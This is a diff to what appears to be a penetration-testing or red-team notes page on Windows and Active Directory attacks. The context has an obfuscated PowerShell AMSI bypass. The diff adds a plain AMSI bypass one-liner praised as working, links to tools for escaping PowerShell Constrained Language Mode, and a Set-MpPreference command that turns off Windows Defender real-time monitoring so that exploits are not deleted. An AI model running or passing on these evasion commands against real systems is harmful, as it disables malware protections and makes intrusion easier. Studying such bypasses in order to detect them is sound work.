@@ -18,6 +18,25 @@
 <h3> Something that works quickly </h3>
   <p>   sETItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE') ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} ) </p>
 
+This works !!!
+(Thanks - https://burmat.gitbook.io/security/hacking/domain-exploitation#user-and-computers-with-unconstrained-delegation)
+[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
+
+Detailed Article on this subject : https://blog.f-secure.com/hunting-for-amsi-bypasses/
+
+
+Constrained Language Mode : 
+Constrained Language consists of a number of restrictions that limit unconstrained code execution on a locked-down system.  (https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)
+
+Check the below for bypassing this 
+https://github.com/padovah4ck/PSByPassCLM
+https://chickenpwny.github.io/concepts/bypass/
+
+
+
+Turning of Windows Defender - Real Time Monitoring (for not letting exploits to be deleted):
+Set-MpPreference -DisableRealtimeMonitoring $true
+
 <H2> Recon of active directory objects :</h2>
 <p>PowerView / Powersploit: https://github.com/PowerShellMafia/PowerSploit</p>
 
